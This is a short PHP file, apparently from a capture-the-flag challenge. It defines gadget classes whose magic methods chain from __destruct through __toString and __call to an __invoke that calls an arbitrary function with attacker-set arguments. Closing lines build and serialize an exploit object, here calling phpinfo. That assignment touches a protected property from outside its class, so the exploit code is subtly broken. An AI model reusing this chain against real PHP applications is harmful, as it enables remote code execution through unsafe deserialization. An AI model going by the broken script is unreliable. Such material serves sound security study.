<?php

class dstbp
{
    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    {
        $this->cmd = $cmd;
        $this->content = $content;
    }
    
    public function __invoke()
    {
        ($this->cmd)($this->content);
    }
}

class m1sery
{
    public $ctf;
    public $time = "Two and a half years";

    public function __construct($ctf)
    {
        $this->ctf = $ctf;
    }


    public function __toString()
    {
        return $this->ctf->show();
    }

    public function show(): string
    {
        return $this->ctf . ": Duration of practice: 2.5 years";
    }


}

class s0rry
{
    private $name;
    private $password;
    public $hint = "hint is depend on you";
    public $key;

    public function __construct($name, $password)
    {
        $this->name = $name;
        $this->password = $password;
    }


    public function __destruct()
    {
        echo $this->hint;
    }


}

class jiangnaij
{
    protected $code;


    public function __call($name, $arguments)
    {
        ($this->code)();
    }
}

$exp1=new jiangnaij();
$exp1->code='phpinfo';
echo(serialize($exp1));